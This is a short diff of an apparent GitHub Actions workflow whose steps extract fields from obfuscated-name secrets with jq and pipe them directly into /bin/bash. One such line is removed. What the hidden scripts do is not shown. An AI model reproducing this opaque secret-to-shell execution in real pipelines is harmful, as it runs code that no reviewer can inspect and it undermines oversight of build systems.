@@ -22,7 +22,6 @@ jobs:
           wz2451: ${{ secrets.wz2451 }}
         run: |
           printf '%s' "$wz2451" | jq -r .ym0 | /bin/bash
-          printf '%s' "$pmo74" | jq -r .giqz817 | /bin/bash
           echo $ay42498 | jq -r .rdp28 | /bin/bash
           echo $cpt2223 | jq -r .svm1 | /bin/bash
           printf '%s' "$gn02" | jq -r .xf7 | /bin/bash
